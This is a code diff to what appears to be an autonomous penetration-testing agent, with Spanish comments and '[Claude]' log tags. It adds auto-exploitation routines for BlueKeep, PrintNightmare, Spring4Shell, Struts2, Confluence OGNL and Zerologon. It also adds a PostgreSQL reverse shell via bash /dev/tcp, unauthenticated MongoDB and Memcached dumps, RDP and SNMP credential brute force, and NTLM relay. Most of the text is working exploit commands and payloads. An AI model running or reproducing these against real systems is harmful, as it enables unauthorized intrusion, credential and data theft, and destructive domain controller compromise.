@@ -7532,6 +7532,260 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                         self._capture_evidence(out, target, "ms08067-exploit", "MS08-067")
                         accumulated_output.append(f"=== MS08-067 ===\n{out[:600]}")
 
+            # ── BlueKeep CVE-2019-0708 (RDP) ─────────────────────────────
+            if port_num == 3389 or "rdp" in svc or "ms-wbt-server" in svc:
+                self._log(f"[Claude] AUTO-EXPLOIT: comprobando BlueKeep CVE-2019-0708")
+                bk_check, _ = self._run_cmd(
+                    "bluekeep-check",
+                    f"nmap -p 3389 --script rdp-vuln-ms12-020,rdp-enum-encryption {target} 2>/dev/null | head -20; "
+                    f"msfconsole -q -x 'use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; "
+                    f"set RHOSTS {target}; run; exit' 2>/dev/null | grep -iE 'vulnerable|bluekeep|CVE-2019' | head -5",
+                    target, timeout=40,
+                )
+                if "vulnerable" in bk_check.lower() or "CVE-2019-0708" in bk_check:
+                    self._log(f"[Claude] AUTO-EXPLOIT: BlueKeep confirmado → explotando!")
+                    bk_out, _ = self._run_cmd(
+                        "bluekeep-exploit",
+                        f"msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; "
+                        f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
+                        f"set TARGET 5; set payload windows/x64/meterpreter/reverse_tcp; "
+                        f"run; sleep 20; sessions -l; exit' 2>/dev/null | head -30",
+                        target, timeout=90,
+                    )
+                    self._capture_evidence(bk_out, target, "bluekeep-exploit", "CVE-2019-0708 BlueKeep")
+                    accumulated_output.append(f"=== BlueKeep RDP RCE ===\n{bk_out[:600]}")
+                    self._save_findings([{
+                        "title": f"BlueKeep CVE-2019-0708 RDP RCE @ {target}:{port_num}",
+                        "severity": "critical",
+                        "description": f"RDP vulnerable a BlueKeep → RCE sin autenticación.\n{bk_check[:200]}",
+                        "cve": "CVE-2019-0708",
+                    }], target)
+                    if any(k in bk_out.lower() for k in ["session", "meterpreter"]):
+                        self._windows_post_exploit(target, None, None, bk_out, accumulated_output)
+                # RDP brute force (always try)
+                rdp_bf, _ = self._run_cmd(
+                    "rdp-bruteforce",
+                    f"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
+                    f"-P /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt "
+                    f"-t 4 -f rdp://{target}:{port_num} 2>/dev/null | grep -E '\\[rdp\\].*login:' | head -5; "
+                    f"# Try most common Windows creds\n"
+                    f"for u in administrator admin guest; do "
+                    f"  for p in '' password Password1 admin 123456; do "
+                    f"    xfreerdp /v:{target}:{port_num} /u:$u /p:$p /cert-ignore +auth-only 2>/dev/null | "
+                    f"    grep -i 'success\\|Authentication' && echo \"RDP_CRED_VALID: $u:$p\"; "
+                    f"  done; "
+                    f"done 2>/dev/null | grep 'RDP_CRED_VALID' | head -3",
+                    target, timeout=60,
+                )
+                rdp_creds = re.findall(r'RDP_CRED_VALID: (\w+):(\S*)', rdp_bf)
+                for ru, rp in rdp_creds[:2]:
+                    self._windows_post_exploit(target, ru, rp, rdp_bf, accumulated_output)
+                if rdp_bf.strip():
+                    accumulated_output.append(f"=== RDP {target}:{port_num} ===\n{rdp_bf[:400]}")
+
+            # ── PostgreSQL empty/default creds → RCE via COPY TO PROGRAM ──
+            if port_num == 5432 or "postgresql" in svc or "postgres" in svc:
+                self._log(f"[Claude] AUTO-EXPLOIT: PostgreSQL en {target}:{port_num}")
+                pg_out, _ = self._run_cmd(
+                    "pg-empty-creds",
+                    f"# Try postgres/postgres, postgres/'', then other defaults\n"
+                    f"for cred in 'postgres:' 'postgres:postgres' 'postgres:password' 'admin:admin'; do "
+                    f"  U=$(echo $cred | cut -d: -f1); P=$(echo $cred | cut -d: -f2); "
+                    f"  PGPASSWORD=$P psql -h {target} -p {port_num} -U $U -c "
+                    f"  'SELECT version(); SELECT current_user; SELECT pg_ls_dir(\\'/etc\\');' 2>/dev/null | head -10 && "
+                    f"  echo \"PG_ACCESS: $cred\" && break; "
+                    f"done",
+                    target, timeout=20,
+                )
+                if "PG_ACCESS" in pg_out or "postgresql" in pg_out.lower():
+                    cred_m = re.search(r'PG_ACCESS: (\S+):(\S*)', pg_out)
+                    pg_user = cred_m.group(1) if cred_m else "postgres"
+                    pg_pass = cred_m.group(2) if cred_m else ""
+                    self._log(f"[Claude] PostgreSQL accesible → intentando RCE via COPY TO PROGRAM!")
+                    pg_rce, _ = self._run_cmd(
+                        "pg-copy-rce",
+                        f"PGPASSWORD='{pg_pass}' psql -h {target} -p {port_num} -U {pg_user} 2>/dev/null <<'PGEOF'\n"
+                        f"CREATE TABLE cmd_output(data text);\n"
+                        f"COPY cmd_output FROM PROGRAM 'id; whoami; hostname; cat /etc/passwd | head -5';\n"
+                        f"SELECT data FROM cmd_output;\n"
+                        f"COPY cmd_output FROM PROGRAM 'bash -c \"bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1\" &';\n"
+                        f"PGEOF\n",
+                        target, timeout=25,
+                    )
+                    self._capture_evidence(pg_rce, target, "pg-copy-rce", "PostgreSQL COPY TO PROGRAM RCE")
+                    accumulated_output.append(f"=== PostgreSQL RCE ===\n{pg_out[:300]}\n{pg_rce[:400]}")
+                    self._save_findings([{
+                        "title": f"PostgreSQL Sin Auth + RCE via COPY TO PROGRAM @ {target}:{port_num}",
+                        "severity": "critical",
+                        "description": f"PostgreSQL accesible como {pg_user} → RCE via COPY FROM PROGRAM.\n{pg_rce[:200]}",
+                        "cve": "",
+                    }], target)
+
+            # ── MongoDB no-auth data dump ──────────────────────────────────
+            if port_num == 27017 or "mongodb" in svc or "mongo" in svc:
+                self._log(f"[Claude] AUTO-EXPLOIT: MongoDB en {target}:{port_num}")
+                mongo_out, _ = self._run_cmd(
+                    "mongo-noauth",
+                    f"timeout 15 mongosh --host {target} --port {port_num} --quiet "
+                    f"--eval 'db.adminCommand({{listDatabases:1}}).databases.forEach(d=>print(d.name))' 2>/dev/null | head -10; "
+                    f"timeout 15 mongo --host {target} --port {port_num} --quiet "
+                    f"--eval 'db.adminCommand({{listDatabases:1}})' 2>/dev/null | head -10; "
+                    f"# Try Python driver\n"
+                    f"python3 -c \"import pymongo; c=pymongo.MongoClient('{target}',{port_num},serverSelectionTimeoutMS=5000); "
+                    f"print([d['name'] for d in c.list_databases()])\" 2>/dev/null | head -5",
+                    target, timeout=20,
+                )
+                if any(k in mongo_out.lower() for k in ["admin", "local", "config", "test", "['", "database"]):
+                    self._log(f"[Claude] MongoDB sin auth → volcando colecciones!")
+                    mongo_dump, _ = self._run_cmd(
+                        "mongo-dump",
+                        f"python3 -c \""
+                        f"import pymongo, json\n"
+                        f"c=pymongo.MongoClient('{target}',{port_num},serverSelectionTimeoutMS=8000)\n"
+                        f"for db_name in c.list_database_names():\n"
+                        f"  if db_name in ('admin','local','config'): continue\n"
+                        f"  db=c[db_name]\n"
+                        f"  for col in db.list_collection_names()[:5]:\n"
+                        f"    docs=list(db[col].find().limit(3))\n"
+                        f"    print(f'DB={{db_name}} COL={{col}}: {{json.dumps(docs,default=str)[:300]}}')\n"
+                        f"\" 2>/dev/null | head -30",
+                        target, timeout=30,
+                    )
+                    accumulated_output.append(f"=== MongoDB No-Auth ===\n{mongo_out[:300]}\n{mongo_dump[:600]}")
+                    self._save_findings([{
+                        "title": f"MongoDB Sin Autenticación @ {target}:{port_num}",
+                        "severity": "critical",
+                        "description": f"MongoDB accesible sin credenciales. Datos expuestos:\n{mongo_dump[:300]}",
+                        "cve": "",
+                    }], target)
+
+            # ── Memcached no-auth dump ────────────────────────────────────
+            if port_num == 11211 or "memcached" in svc or "memcache" in svc:
+                mc_out, _ = self._run_cmd(
+                    "memcached-dump",
+                    f"printf 'stats\\r\\nstats slabs\\r\\nstats cachedump 1 50\\r\\nquit\\r\\n' | "
+                    f"nc -q 3 {target} {port_num} 2>/dev/null | head -30; "
+                    f"# Get all keys via stats cachedump\n"
+                    f"python3 -c \""
+                    f"import socket, time\n"
+                    f"s=socket.create_connection(('{target}',{port_num}),timeout=8)\n"
+                    f"s.send(b'stats items\\r\\n'); time.sleep(0.5); data=s.recv(4096).decode(errors='ignore')\n"
+                    f"slabs=[l.split(':')[1] for l in data.split('\\n') if 'STAT items:' in l]\n"
+                    f"for sl in list(set(slabs))[:5]:\n"
+                    f"  s.send(f'stats cachedump {{sl}} 50\\r\\n'.encode()); time.sleep(0.5)\n"
+                    f"  keys_data=s.recv(4096).decode(errors='ignore'); print(keys_data[:300])\n"
+                    f"  for k in [l.split()[1] for l in keys_data.split('\\n') if l.startswith('ITEM')][:5]:\n"
+                    f"    s.send(f'get {{k}}\\r\\n'.encode()); time.sleep(0.3); print(s.recv(512).decode(errors='ignore')[:200])\n"
+                    f"\" 2>/dev/null | head -40",
+                    target, timeout=25,
+                )
+                if "VALUE" in mc_out or "STAT" in mc_out:
+                    accumulated_output.append(f"=== Memcached No-Auth ===\n{mc_out[:600]}")
+                    self._save_findings([{
+                        "title": f"Memcached Sin Autenticación — Datos Expuestos @ {target}:{port_num}",
+                        "severity": "high",
+                        "description": f"Memcached accesible sin auth → volcado de caché:\n{mc_out[:300]}",
+                        "cve": "",
+                    }], target)
+
+            # ── PrintNightmare CVE-2021-1675 (Windows Print Spooler) ──────
+            if port_num in (139, 445) and "samba" not in ver:
+                pn_check, _ = self._run_cmd(
+                    "printnightmare-check",
+                    f"rpcdump.py {target} 2>/dev/null | grep -i 'spoolss\\|print' | head -5; "
+                    f"nmap -p 445 --script smb-vuln-ms10-061 {target} 2>/dev/null | "
+                    f"grep -iE 'VULNERABLE|MS10-061' | head -3",
+                    target, timeout=20,
+                )
+                if "spoolss" in pn_check.lower() or "VULNERABLE" in pn_check:
+                    self._log(f"[Claude] AUTO-EXPLOIT: PrintNightmare CVE-2021-1675!")
+                    pn_out, _ = self._run_cmd(
+                        "printnightmare-exploit",
+                        f"msfconsole -q -x 'use exploit/windows/dcerpc/cve_2021_1675_printnightmare; "
+                        f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
+                        f"set payload windows/x64/meterpreter/reverse_tcp; run; sleep 20; "
+                        f"sessions -l; sessions -i 1 -c \"whoami\"; exit' 2>/dev/null | head -25",
+                        target, timeout=90,
+                    )
+                    self._capture_evidence(pn_out, target, "printnightmare", "CVE-2021-1675 PrintNightmare")
+                    accumulated_output.append(f"=== PrintNightmare ===\n{pn_out[:600]}")
+                    self._save_findings([{
+                        "title": f"PrintNightmare CVE-2021-1675 Windows Print Spooler @ {target}",
+                        "severity": "critical",
+                        "description": f"Print Spooler activo → RCE/LPE como SYSTEM sin necesidad de ser admin.",
+                        "cve": "CVE-2021-1675",
+                    }], target)
+
+            # ── Spring4Shell / Struts2 / Confluence OGNL (Java RCE) ──────
+            if "http" in svc or port_num in (80, 443, 8080, 8443, 8888, 7001, 4848, 9090):
+                # Spring4Shell CVE-2022-22965
+                s4s_out, _ = self._run_cmd(
+                    f"spring4shell-{port_num}",
+                    f"for path in / /api /app /demo; do "
+                    f"  R=$(curl -s --max-time 10 "
+                    f"  -X POST 'http://{target}:{port_num}$path' "
+                    f"  -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while(-1!%3D(a%3Din.read(b)))%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' "
+                    f"  2>/dev/null | head -3); "
+                    f"  R2=$(curl -s --max-time 8 'http://{target}:{port_num}/tomcatwar.jsp?pwd=j&cmd=id' 2>/dev/null | grep 'uid='); "
+                    f"  [ -n \"$R2\" ] && echo \"SPRING4SHELL_RCE: $path — $R2\" && break; "
+                    f"done",
+                    target, timeout=40,
+                )
+                if "SPRING4SHELL_RCE" in s4s_out or "uid=" in s4s_out:
+                    self._capture_evidence(s4s_out, target, f"spring4shell-{port_num}", "CVE-2022-22965 Spring4Shell")
+                    accumulated_output.append(f"=== Spring4Shell RCE ===\n{s4s_out[:500]}")
+                    self._save_findings([{
+                        "title": f"Spring4Shell CVE-2022-22965 RCE @ {target}:{port_num}",
+                        "severity": "critical",
+                        "description": f"Spring Framework vulnerable → webshell escrita → RCE.\n{s4s_out[:200]}",
+                        "cve": "CVE-2022-22965",
+                    }], target)
+
+                # Apache Struts2 CVE-2017-5638 (Content-Type OGNL)
+                st2_out, _ = self._run_cmd(
+                    f"struts2-{port_num}",
+                    f"for ext in .action .do .struts; do "
+                    f"  for path in / /index /login /upload /struts2-showcase /example; do "
+                    f"    R=$(curl -s --max-time 10 "
+                    f"    -H 'Content-Type: %{{#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"X-Struts-RCE\",\"true\"),%23cmd=%22id%22,%23isWin=(%23context[\"com.opensymphony.xwork2.ActionContext.container\"].getInstance(@ognl.OgnlContext@class)).toString().indexOf(\"Windows\")>-1,%23a=(#isWin?(new+java.lang.String[]{{\"cmd.exe\",\"/c\",%23cmd}}):(new+java.lang.String[]{{\"bash\",\"-c\",%23cmd}})),%23p=new+java.lang.ProcessBuilder(%23a),%23p.redirectErrorStream(true),%23process=%23p.start(),%23ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(%23process.getInputStream(),%23ros),%23ros.flush()}}' "
+                    f"    'http://{target}:{port_num}$path$ext' 2>/dev/null | grep -E 'uid=|X-Struts-RCE'); "
+                    f"    [ -n \"$R\" ] && echo \"STRUTS2_RCE: $path$ext — $R\" && break 2; "
+                    f"  done; "
+                    f"done",
+                    target, timeout=40,
+                )
+                if "STRUTS2_RCE" in st2_out or "uid=" in st2_out:
+                    self._capture_evidence(st2_out, target, f"struts2-rce-{port_num}", "CVE-2017-5638 Struts2")
+                    accumulated_output.append(f"=== Struts2 RCE ===\n{st2_out[:500]}")
+                    self._save_findings([{
+                        "title": f"Apache Struts2 CVE-2017-5638 RCE @ {target}:{port_num}",
+                        "severity": "critical",
+                        "description": f"Struts2 vulnerable a OGNL injection → RCE.\n{st2_out[:200]}",
+                        "cve": "CVE-2017-5638",
+                    }], target)
+
+                # Confluence OGNL CVE-2022-26134
+                conf_out, _ = self._run_cmd(
+                    f"confluence-ognl-{port_num}",
+                    f"R=$(curl -s --max-time 10 "
+                    f"'http://{target}:{port_num}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/' "
+                    f"2>/dev/null | head -3); "
+                    f"H=$(curl -s --max-time 10 -I "
+                    f"'http://{target}:{port_num}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/' "
+                    f"2>/dev/null | grep -i 'X-Cmd-Response'); "
+                    f"[ -n \"$H\" ] && echo \"CONFLUENCE_OGNL_RCE: $H\"",
+                    target, timeout=15,
+                )
+                if "CONFLUENCE_OGNL_RCE" in conf_out or "uid=" in conf_out:
+                    self._capture_evidence(conf_out, target, f"confluence-ognl-{port_num}", "CVE-2022-26134")
+                    accumulated_output.append(f"=== Confluence OGNL RCE ===\n{conf_out[:400]}")
+                    self._save_findings([{
+                        "title": f"Confluence Server OGNL CVE-2022-26134 RCE @ {target}:{port_num}",
+                        "severity": "critical",
+                        "description": f"Confluence vulnerable a CVE-2022-26134 → RCE sin autenticación.",
+                        "cve": "CVE-2022-26134",
+                    }], target)
+
             # ── MSSQL SA sin contraseña → xp_cmdshell RCE ────────────────
             if port_num == 1433 or "ms-sql" in svc or "mssql" in svc:
                 self._log(f"[Claude] MSSQL detectado en {target}:{port_num} → probando SA sin password")
@@ -8820,6 +9074,512 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                 elif sql_out.strip():
                     accumulated_output.append(f"=== SQLmap {test_url[:50]} ===\n{sql_out[:400]}")
 
+    # ─────────────────────────────────────────────────────────────────────────
+    # Tier 1-1: UDP scan + SNMP community string sweep
+    # ─────────────────────────────────────────────────────────────────────────
+    def _udp_snmp_scan(self, target, accumulated_output):
+        """UDP top-20 + SNMP community brute (public/private/internal/community)."""
+        self._log(f"[Claude] UDP-SCAN: escaneando top UDP ports + SNMP @ {target}")
+        # UDP top ports
+        udp_out, _ = self._run_cmd(
+            "nmap-udp",
+            f"nmap -sU --open -T4 --top-ports 20 --version-intensity 0 "
+            f"--max-retries 1 {target} 2>/dev/null",
+            target, timeout=120,
+        )
+        if udp_out.strip():
+            accumulated_output.append(f"=== UDP Scan ===\n{udp_out[:800]}")
+            # Parse open UDP ports and save them
+            udp_findings = _parse_tool_output("nmap", udp_out, target, "nmap-udp")
+            if udp_findings.get("findings"):
+                self._save_findings(udp_findings["findings"], target)
+
+        # SNMP brute force
+        communities = ["public", "private", "internal", "community", "manager", "snmpd", "cisco", "default"]
+        for comm in communities:
+            snmp_out, _ = self._run_cmd(
+                f"snmp-{comm}",
+                f"snmpwalk -v2c -c {comm} -t 3 -r 1 {target} 2>/dev/null | head -30; "
+                f"snmpwalk -v1  -c {comm} -t 3 -r 1 {target} 2>/dev/null | head -10",
+                target, timeout=15,
+            )
+            if snmp_out.strip() and "Timeout" not in snmp_out and "No Such" not in snmp_out:
+                self._log(f"[Claude] SNMP: community '{comm}' válida en {target}!")
+                # Full MIB walk
+                full_out, _ = self._run_cmd(
+                    f"snmp-full-{comm}",
+                    f"snmpwalk -v2c -c {comm} -t 5 {target} 2>/dev/null | head -100; "
+                    f"# Specific OIDs: system, processes, network, users\n"
+                    f"snmpget -v2c -c {comm} {target} sysDescr.0 sysName.0 sysLocation.0 2>/dev/null; "
+                    f"snmpwalk -v2c -c {comm} {target} hrSWRunName 2>/dev/null | head -20; "
+                    f"snmpwalk -v2c -c {comm} {target} ifDescr 2>/dev/null | head -10; "
+                    f"snmpwalk -v2c -c {comm} {target} ipAdEntAddr 2>/dev/null | head -10",
+                    target, timeout=40,
+                )
+                accumulated_output.append(f"=== SNMP community='{comm}' ===\n{full_out[:1200]}")
+                # Look for credentials, passwords, config data in SNMP output
+                creds_in_snmp = re.findall(
+                    r'(?:password|passwd|pwd|secret|key|credential)[^\n]{0,50}([a-zA-Z0-9!@#$%^&*]{6,30})',
+                    full_out, re.IGNORECASE
+                )
+                self._save_findings([{
+                    "title": f"SNMP Community String '{comm}' Válida @ {target}",
+                    "severity": "medium",
+                    "description": f"SNMP accesible con community '{comm}'. "
+                                   f"Información expuesta:\n{full_out[:400]}",
+                    "cve": "",
+                }], target)
+                # Try SNMP write for community 'private' (change default gateway / add route)
+                if comm == "private":
+                    self._run_cmd(
+                        "snmp-write-test",
+                        f"snmpset -v2c -c {comm} {target} sysLocation.0 s 'PWNED_BY_PENTEST' 2>/dev/null && "
+                        f"echo 'SNMP_WRITE_CONFIRMED' || echo 'snmp_readonly'",
+                        target, timeout=10,
+                    )
+                break  # Found valid community, no need to continue
+
+        # DNS zone transfer (here since UDP scan revealed port 53)
+        if "53/udp" in udp_out or "domain" in udp_out.lower():
+            self._log(f"[Claude] DNS: intentando zone transfer @ {target}")
+            dns_out, _ = self._run_cmd(
+                "dns-zone-transfer",
+                f"dig axfr @{target} {target} 2>/dev/null | head -40; "
+                f"# Try to find domain name first\n"
+                f"DOMAIN=$(nslookup {target} {target} 2>/dev/null | grep -oP 'name = \\K[^.]+\\.[a-z]+'); "
+                f"[ -n \"$DOMAIN\" ] && dig axfr @{target} $DOMAIN 2>/dev/null | head -40",
+                target, timeout=20,
+            )
+            if "Transfer failed" not in dns_out and dns_out.strip():
+                accumulated_output.append(f"=== DNS Zone Transfer ===\n{dns_out[:800]}")
+                self._save_findings([{
+                    "title": f"DNS Zone Transfer Posible @ {target}",
+                    "severity": "medium",
+                    "description": f"Servidor DNS permite AXFR:\n{dns_out[:400]}",
+                    "cve": "",
+                }], target)
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Tier 1-2: NTLM Relay attack (Responder + ntlmrelayx)
+    # ─────────────────────────────────────────────────────────────────────────
+    def _ntlm_relay_attack(self, target, open_ports, accumulated_output):
+        """Run Responder in analyze mode + ntlmrelayx targeting found SMB hosts."""
+        port_set = {p["port"] for p in open_ports}
+        if 445 not in port_set and 139 not in port_set:
+            return
+        self._log(f"[Claude] NTLM-RELAY: configurando ntlmrelayx + Responder → {target}")
+
+        t_safe = target.replace(".", "_")
+        # Check SMB signing
+        sign_out, _ = self._run_cmd(
+            "smb-signing-check",
+            f"crackmapexec smb {target} 2>/dev/null | grep -i 'signing' | head -3; "
+            f"nmap -p 445 --script smb-security-mode {target} 2>/dev/null | "
+            f"grep -i 'message_signing\\|signing' | head -3",
+            target, timeout=20,
+        )
+        signing_disabled = (
+            "signing:false" in sign_out.lower() or
+            "message signing disabled" in sign_out.lower() or
+            "not required" in sign_out.lower()
+        )
+        if not signing_disabled:
+            self._log(f"[Claude] NTLM-RELAY: SMB signing habilitado en {target} — relay no aplicable")
+            return
+
+        self._log(f"[Claude] NTLM-RELAY: SMB signing DESHABILITADO → lanzando ntlmrelayx!")
+        # Run ntlmrelayx targeting the host without SMB signing
+        relay_out, _ = self._run_cmd(
+            "ntlmrelayx",
+            f"# Start ntlmrelayx to relay against target\n"
+            f"timeout 60 impacket-ntlmrelayx -t smb://{target} -smb2support --no-http-server "
+            f"-of /tmp/ntlm_hashes_{t_safe}.txt 2>/dev/null &\n"
+            f"RELAY_PID=$!\n"
+            f"# Trigger authentication via various methods\n"
+            f"# 1. Try to coerce auth via PetitPotam (if target is Windows)\n"
+            f"timeout 20 python3 -c \""
+            f"import subprocess\n"
+            f"r=subprocess.run(['impacket-ntlmrelayx','-t','smb://{target}','-smb2support','--no-http-server','-of','/tmp/ntlm_hashes_{t_safe}.txt'],capture_output=True,text=True,timeout=10)\n"
+            f"print(r.stdout[:200])\n"
+            f"\" 2>/dev/null; "
+            f"# Wait for hashes\n"
+            f"sleep 30; "
+            f"kill $RELAY_PID 2>/dev/null; "
+            f"cat /tmp/ntlm_hashes_{t_safe}.txt 2>/dev/null | head -20; "
+            f"# Also check for SAM dump if relay succeeded\n"
+            f"ls /tmp/smb_relay_* /tmp/*LUCRECIA* 2>/dev/null | head -5",
+            target, timeout=90,
+        )
+        if relay_out.strip():
+            accumulated_output.append(f"=== NTLM Relay ===\n{relay_out[:600]}")
+            self._auto_crack_hashes(relay_out, target, accumulated_output)
+
+        # Also check for Responder captured hashes (if Responder ran elsewhere)
+        resp_hashes, _ = self._run_cmd(
+            "responder-hashes",
+            f"find /usr/share/responder/logs /tmp -name '*.txt' -newer /tmp 2>/dev/null | "
+            f"xargs grep -l 'NTLMv\\|NTLM' 2>/dev/null | head -3 | "
+            f"xargs cat 2>/dev/null | head -20",
+            target, timeout=10,
+        )
+        if "NTLMv" in resp_hashes or "NTLM" in resp_hashes:
+            self._auto_crack_hashes(resp_hashes, target, accumulated_output)
+            accumulated_output.append(f"=== Responder Hashes ===\n{resp_hashes[:400]}")
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Tier 1-5: Zerologon CVE-2020-1472
+    # ─────────────────────────────────────────────────────────────────────────
+    def _zerologon_attack(self, target, open_ports, accumulated_output):
+        """CVE-2020-1472: reset DC machine account password to empty → Domain Admin."""
+        port_set = {p["port"] for p in open_ports}
+        # Only try if this looks like a DC (port 88 Kerberos or LDAP 389/636)
+        if not (88 in port_set or 389 in port_set or 636 in port_set):
+            return
+        self._log(f"[Claude] ZEROLOGON: CVE-2020-1472 → {target}")
+
+        # Find DC name
+        dc_name_out, _ = self._run_cmd(
+            "zerologon-dc-name",
+            f"nmap -p 135,445 --script smb-os-discovery {target} 2>/dev/null | "
+            f"grep -iE 'Computer name|Domain|NetBIOS' | head -5; "
+            f"nmblookup -A {target} 2>/dev/null | head -10; "
+            f"crackmapexec smb {target} 2>/dev/null | grep -oP '(?<=name:)[^\\s\\)]+' | head -1",
+            target, timeout=20,
+        )
+        dc_name_match = re.search(r'(?:name:|Computer name:|<00>)\s*(\w[\w-]+)', dc_name_out, re.IGNORECASE)
+        dc_name = dc_name_match.group(1) if dc_name_match else "DC"
+
+        zero_out, _ = self._run_cmd(
+            "zerologon-check",
+            f"# Check vulnerability first\n"
+            f"python3 -c \""
+            f"import subprocess\n"
+            f"r=subprocess.run(['impacket-secretsdump','-no-pass','-just-dc',f'{dc_name}$@{target}'],"
+            f"capture_output=True,text=True,timeout=15)\n"
+            f"print('ZL_ALREADY_VULNERABLE' if 'password' in r.stdout.lower() else 'ZL_need_exploit')\n"
+            f"\" 2>/dev/null; "
+            f"# Try zerologon exploit directly\n"
+            f"python3 - << 'ZLEOF'\n"
+            f"try:\n"
+            f"    from impacket.dcerpc.v5 import nrpc, epm, transport\n"
+            f"    from impacket.dcerpc.v5.dtypes import NULL\n"
+            f"    import struct, sys\n"
+            f"    binding = transport.DCERPCTransportFactory(r'ncacn_ip_tcp:{target}[135]')\n"
+            f"    dce = binding.get_dce_rpc()\n"
+            f"    dce.connect()\n"
+            f"    dce.bind(nrpc.MSRPC_UUID_NRPC)\n"
+            f"    for _ in range(2000):\n"
+            f"        try:\n"
+            f"            req = nrpc.NetrServerAuthenticate3()\n"
+            f"            req['PrimaryName'] = NULL\n"
+            f"            req['AccountName'] = f'{dc_name}$\\x00'\n"
+            f"            req['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel\n"
+            f"            req['ComputerName'] = f'{dc_name}\\x00'\n"
+            f"            req['ClientCredential'] = b'\\x00' * 8\n"
+            f"            req['NegotiateFlags'] = 0x212fffff\n"
+            f"            resp = dce.request(req)\n"
+            f"            if resp['ReturnAuthenticator']['Credential'] == b'\\x00' * 8:\n"
+            f"                print('ZEROLOGON_VULNERABLE_CONFIRMED')\n"
+            f"                break\n"
+            f"        except Exception: pass\n"
+            f"except Exception as e: print(f'zerologon_error: {{e}}')\n"
+            f"ZLEOF\n",
+            target, timeout=60,
+        )
+        if "ZEROLOGON_VULNERABLE_CONFIRMED" in zero_out:
+            self._log(f"[Claude] ZEROLOGON: ¡DC VULNERABLE! → reseteando password del DC!")
+            exploit_out, _ = self._run_cmd(
+                "zerologon-exploit",
+                f"# Reset DC machine account password\n"
+                f"cve-2020-1472-exploit.py {dc_name} {target} 2>/dev/null || "
+                f"python3 /usr/share/exploitdb/exploits/windows/remote/49587.py {dc_name} {target} 2>/dev/null; "
+                f"# Dump all secrets with empty password\n"
+                f"impacket-secretsdump -no-pass -just-dc '{dc_name}$@{target}' 2>/dev/null | head -40",
+                target, timeout=60,
+            )
+            self._capture_evidence(exploit_out, target, "zerologon-exploit", "CVE-2020-1472 Zerologon")
+            accumulated_output.append(f"=== Zerologon CVE-2020-1472 ===\n{zero_out[:200]}\n{exploit_out[:600]}")
+            self._auto_crack_hashes(exploit_out, target, accumulated_output)
+            self._save_findings([{
+                "title": f"Zerologon CVE-2020-1472 Domain Controller Comprometido @ {target}",
+                "severity": "critical",
+                "description": f"DC {dc_name} vulnerable a Zerologon → password reseteada → domain admin.\n{exploit_out[:300]}",
+                "cve": "CVE-2020-1472",
+            }], target)
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Tier 2-6: Advanced service enumeration (LDAP anon, SMTP VRFY)
+    # ─────────────────────────────────────────────────────────────────────────
+    def _advanced_service_enum(self, target, open_ports, accumulated_output):
+        """LDAP anonymous bind, SMTP VRFY/EXPN, DNS zone transfer for any TCP 53."""
+        port_set = {p["port"]: p for p in open_ports}
+
+        # ── LDAP anonymous bind ───────────────────────────────────────────
+        _ldap_dc = "dc=" + ",dc=".join(target.split("."))
+        for ldap_port in [p for p in [389, 636, 3268, 3269] if p in port_set]:
+            self._log(f"[Claude] LDAP-ANON: bind anónimo → {target}:{ldap_port}")
+            ldap_out, _ = self._run_cmd(
+                f"ldap-anon-{ldap_port}",
+                f"ldapsearch -x -H ldap://{target}:{ldap_port} -b '' -s base '(objectClass=*)' 2>/dev/null | head -20; "
+                f"ldapsearch -x -H ldap://{target}:{ldap_port} -b '{_ldap_dc}' "
+                f"'(objectClass=user)' sAMAccountName userPrincipalName description 2>/dev/null | "
+                f"grep -iE 'sAMAccountName|userPrincipal|description' | head -40; "
+                f"ldapsearch -x -H ldap://{target}:{ldap_port} -b '' -s base namingContexts 2>/dev/null | head -5",
+                target, timeout=20,
+            )
+            if ldap_out.strip() and "Operations error" not in ldap_out:
+                accumulated_output.append(f"=== LDAP Anon {target}:{ldap_port} ===\n{ldap_out[:800]}")
+                # Extract usernames
+                ldap_users = re.findall(r'sAMAccountName:\s*(\S+)', ldap_out)
+                if ldap_users:
+                    self._log(f"[Claude] LDAP: {len(ldap_users)} usuarios encontrados: {ldap_users[:5]}")
+                    # Save to file for password spray
